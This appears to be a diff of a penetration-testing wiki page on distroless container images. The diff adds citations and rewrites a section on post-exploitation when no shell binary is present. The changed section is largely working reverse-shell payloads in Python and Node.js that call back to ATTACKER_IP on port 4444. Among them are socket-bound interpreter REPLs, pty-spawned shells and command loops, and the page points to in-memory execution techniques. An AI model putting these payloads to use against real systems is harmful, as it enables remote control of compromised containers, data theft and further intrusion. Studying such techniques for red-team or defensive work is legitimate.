@@ -4,7 +4,7 @@
 
 ## Overview
 
-A **distroless** container image is an image that ships the **minimum runtime components required to run one specific application**, while intentionally removing the usual distribution tooling such as package managers, shells, and large sets of generic userland utilities. In practice, distroless images often contain only the application binary or runtime, its shared libraries, certificate bundles, and a very small filesystem layout.
+A **distroless** container image ships the **minimum runtime components required to run one specific application**, while intentionally removing the usual distribution tooling such as package managers, shells, and large sets of generic userland utilities. In practice, distroless images often contain only the application binary or runtime, its shared libraries, certificate bundles, and a very small filesystem layout. <sup>[[1]](#references)</sup>
 
 The point is not that distroless is a new kernel isolation primitive. Distroless is an **image design strategy**. It changes what is available **inside** the container filesystem, not how the kernel isolates the container. That distinction matters, because distroless hardens the environment mainly by reducing what an attacker can use after gaining code execution. It does not replace namespaces, seccomp, capabilities, AppArmor, SELinux, or any other runtime isolation mechanism.
 
@@ -21,8 +21,8 @@ That is why distroless images are popular in production application deployments.
 
 Examples of well-known distroless-style image families include:
 
-- Google's distroless images
-- Chainguard hardened/minimal images
+- Google's distroless images <sup>[[1]](#references)</sup>
+- Chainguard hardened/minimal images <sup>[[2]](#references)</sup>
 
 ## What Distroless Does Not Mean
 
@@ -89,51 +89,82 @@ Impact:
 - filesystem enumeration without `/bin/ls`
 - identification of writable paths and mounted secrets
 
-### Reverse Shell Without `/bin/sh`
+### Interactive Runtime Without `/bin/sh`
 
-If the image does not contain `sh` or `bash`, a classic shell-based reverse shell may fail immediately. In that situation, use the installed language runtime instead.
+If the image does not contain `sh` or `bash`, a classic shell-based reverse shell fails. In that situation, expose an interactive session in the installed language runtime instead of spawning a nonexistent shell.
 
-Python reverse shell:
+For example, this Python payload redirects an interactive Python console over a socket:
 
 ```bash
 python3 - <<'PY'
-import os,pty,socket
-s=socket.socket()
-s.connect(("ATTACKER_IP",4444))
-for fd in (0,1,2):
-    os.dup2(s.fileno(),fd)
-pty.spawn("/bin/sh")
+import code, socket, sys
+s = socket.create_connection(("ATTACKER_IP", 4444))
+stream = s.makefile("rw", buffering=1)
+sys.stdin = sys.stdout = sys.stderr = stream
+code.interact(local=globals())
 PY
 ```
 
-If `/bin/sh` does not exist, replace the final line with direct Python-driven command execution or a Python REPL loop.
-
-Node reverse shell:
+The equivalent Node.js approach can evaluate JavaScript received over a socket. It is a JavaScript REPL, not an operating-system shell; filesystem, process, and networking operations must be performed through Node's APIs:
 
 ```bash
-node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
+node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
 ```
 
-Again, if `/bin/sh` is absent, use Node's filesystem, process, and networking APIs directly instead of spawning a shell.
+Both examples require outbound connectivity and an available interpreter, and both provide only the functionality exposed by that interpreter.
+
+If the image unexpectedly includes `/bin/sh`, the classic interpreter-assisted shell payloads remain useful. They are shown separately because they are not genuinely shell-free:
+
+```bash
+# Python plus an existing /bin/sh
+python3 - <<'PY'
+import os, pty, socket
+s = socket.create_connection(("ATTACKER_IP", 4444))
+for fd in (0, 1, 2):
+    os.dup2(s.fileno(), fd)
+pty.spawn("/bin/sh")
+PY
+
+# Node.js plus an existing /bin/sh
+node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
+```
+
+The older Python command-loop pattern is also useful when `/bin/sh` exists but an interactive PTY is inconvenient. It is retained here with its real dependency made explicit: `subprocess.run(..., shell=True)` invokes the system shell and therefore is **not** a no-shell technique.
+
+```bash
+python3 -c '
+import subprocess
+while True:
+    cmd = input("sh> ")
+    if cmd.strip() in ("exit", "quit"):
+        break
+    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    print(result.stdout, end="")
+    print(result.stderr, end="")
+'
+```
 
 ### Full Example: No-Shell Python Command Loop
 
-If the image has Python but no shell at all, a simple interactive loop is often enough to keep full post-exploitation capability:
+If the image has Python but no shell at all, a local Python REPL can still support filesystem, environment, and network inspection:
 
 ```bash
 python3 - <<'PY'
-import os,subprocess
+namespace = {}
 while True:
-    cmd=input("py> ")
-    if cmd.strip() in ("exit","quit"):
+    source = input("py> ")
+    if source.strip() in ("exit", "quit"):
         break
-    p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
-    print(p.stdout, end="")
-    print(p.stderr, end="")
+    try:
+        result = eval(source, namespace)
+        if result is not None:
+            print(repr(result))
+    except SyntaxError:
+        exec(source, namespace)
 PY
 ```
 
-This does not require an interactive shell binary. The impact is effectively the same as a basic shell from the attacker's perspective: command execution, enumeration, and staging of further payloads through the existing runtime.
+This loop does not invoke `/bin/sh`. It evaluates Python expressions and statements directly, so operations must use Python APIs rather than shell commands. Within that limitation, it can still provide much of the impact of a basic shell: filesystem and environment enumeration, data access, network activity, and staging further payloads through the installed runtime.
 
 ### In-Memory Tool Execution
 
@@ -153,7 +184,7 @@ The dedicated page for that is:
 
 The most relevant techniques there are:
 
-- `memfd_create` + `execve` via scripting runtimes
+- `memfd_create` + `execve` via scripting runtimes <sup>[[4]](#references)</sup>
 - DDexec / EverythingExec
 - memexec
 - memdlopen
@@ -202,7 +233,7 @@ What is interesting here:
 | Kubernetes workloads using distroless images | Depends on Pod config | Distroless affects userland only; Pod security posture still depends on the Pod spec and runtime defaults | adding ephemeral debug containers, host mounts, privileged Pod settings |
 | Docker / Podman running distroless images | Depends on run flags | Minimal filesystem, but runtime security still depends on flags and daemon configuration | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |
 
-The key point is that distroless is an **image property**, not a runtime protection. Its value comes from reducing what is available inside the filesystem after compromise.
+The key point is that distroless is an **image property**, not a runtime protection. Its value comes from reducing what is available inside the filesystem after compromise. Multi-stage builds are a common way to keep build tools out of the final image. <sup>[[3]](#references)</sup>
 
 ## Related Pages
 
@@ -221,5 +252,12 @@ runtime-api-and-daemon-exposure.md
 {{#ref}}
 sensitive-host-mounts.md
 {{#endref}}
+
+## References
+
+- [1] [GoogleContainerTools - Distroless container images](https://github.com/GoogleContainerTools/distroless)
+- [2] [Chainguard Images documentation](https://edu.chainguard.dev/chainguard/chainguard-images/)
+- [3] [Docker Docs - Multi-stage builds](https://docs.docker.com/build/building/multi-stage/)
+- [4] [`memfd_create(2)` - Linux manual page](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
 
 {{#include ../../../banners/hacktricks-training.md}}
